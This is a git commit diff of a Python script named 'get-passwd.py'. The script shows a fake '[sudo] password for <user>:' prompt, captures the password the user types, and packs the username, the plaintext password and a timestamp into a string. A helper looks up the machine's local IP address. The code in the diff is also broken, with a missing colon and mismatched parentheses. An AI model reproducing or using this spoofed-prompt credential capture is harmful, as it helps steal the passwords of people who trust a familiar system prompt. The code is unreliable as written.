17683fabd9381fc39e771b5477dba4613060ebb8
Dane Morgan <32076156+deadlift1226@users.noreply.github.com>
2019-03-02 15:06:49 -0700

    Update get-passwd.py

--- get-passwd.py
+++ get-passwd.py
@@ -3,14 +3,19 @@
 from getpass import getuser, getpass
 from datetime import datetime
 import socket
-def get_passwd():
+
+def get_ip()
+    print([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] 
+    if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), 
+    s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, 
+    socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
+
+
+def get_info():
     curr_user = getuser()
     prompt = "[sudo] password for " + curr_user + ': '
-    passwd = getpass(prompt)
-    #print(gethostbyname_ex(gethostname()))
-    print([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith('127.')][:1]), [[s.connect(('8.8.8.8',53)),s.getsockname()[0], 
-        s.close()) for s in [socket.socket(socket.AF_INET, 
-            socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
+    passwd = getpass(prompt) 
+
     #info = 'ip_addr: <' + ip_addr + '> username:<' + curr_user + '>, passwd:<' + passwd +'>, ' + str(datetime.now())  
     info = 'username:<' + curr_user + '>, passwd:<' + passwd +'>, ' + str(datetime.now())  
 
